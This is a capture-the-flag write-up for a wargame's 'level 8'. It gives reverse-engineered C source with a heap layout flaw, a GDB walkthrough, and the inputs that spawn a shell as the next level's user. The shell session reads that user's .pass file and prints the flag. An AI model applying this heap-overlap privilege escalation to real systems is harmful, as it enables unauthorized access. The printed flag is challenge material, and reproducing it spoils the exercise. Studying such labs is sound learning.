## LEVEL 8
---
### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
---

Exceptionally, I will show you the C version directly since the assembly code is too long and complex to explain. This C code is the source code I obtained by reverse engineering the assembly code myself.

```c
char	*auth = NULL;
char	*service = NULL;

int
main (void) {
	char	buffer[128];
	
	while (1) {
		printf("%p, %p\n", auth, service);
		if (fgets(buffer, 128, stdin) == 0)
			break;
		if (strncmp(buffer, "auth ", 5) == 0) {
			auth = malloc(4);
			auth[0] = 0;
			if (strlen(buffer + 5) <= 30)
				strcpy(auth, buffer + 5);
		}
		if (strncmp(buffer, "reset", 5) == 0)
			free(auth);
		if (strncmp(buffer, "service", 6) == 0)
			service = strdup(buffer + 7);
		if (strncmp(buffer, "login", 5) == 0) {
			if (auth[32] != 0)
				system("/bin/sh");
			else
				fwrite("Password:\n", 10, 1, stdout);
		}
	}
	return (0);
}
```

This program runs a prompts where you can enter commands. The commands are the following:

- `auth` allocates 4 bytes than copies the 25 characters that you enter after the command.
- `reset` frees the allocated memory by auth.
- `service` duplicates the text you enter after the command inside service without limitation.
- `login` checks if the 33rd character of auth is not null. If it is not null, it executes a shell. Else, it prints "Password:\n".

This level is relatively easy; you just need to bypass the `auth[32] != 0` condition. To achieve that, we need to find the right combination of commands that will result in `auth[32]` being not null.

Before proceeding, I recommend that you read the previous levels to quickly understand how malloc works. This will provide you with the necessary background knowledge to better comprehend the upcoming tasks.

I will description the solution in the following steps:

1. Allocate 4 bytes with `auth` this value will be checked by `login` later.

``` shell
(gdb) r
Starting program: /home/user/level8/level8

Breakpoint 1, 0x08048591 in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.
(nil), (nil)
auth mamaurai

Breakpoint 1, 0x08048591 in main ()
(gdb) x/16a *0x8049aac
0x804a008:	0x616d616d	0x69617275	0xa	0x20ff1
0x804a018:	0x0	0x0	0x0	0x0
0x804a028:	0x0	0x0	0x0	0x0
0x804a038:	0x0	0x0	0x0	0x0
```

2. Allocate more than 32 bytes with `service`. The `strdup` function should allocate memory right after the `auth` variable.

``` shell
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048591 in main ()
(gdb) x/16a *0x8049aac
0x804a008:	0x616d616d	0x69617275	0xa	0x31
0x804a018:	0x41414120	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0xa	0x0	0x20fc1
```

3. Check the value at auth[32].

```shell
(gdb) x *0x8049aac+32
0x804a028:	0x41414141
```

4. Login to get the shell.

```shell
(gdb) n
Single stepping until exit from function main,
which has no line number information.
0x804a008, 0x804a018
login
$ whoami
level8
```
Perfect, you just need to do the same thing outside of GDB because GDB runs the programs with your user as the owner.
```shell
$ ./level8
(nil), (nil)
auth mamaurai
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
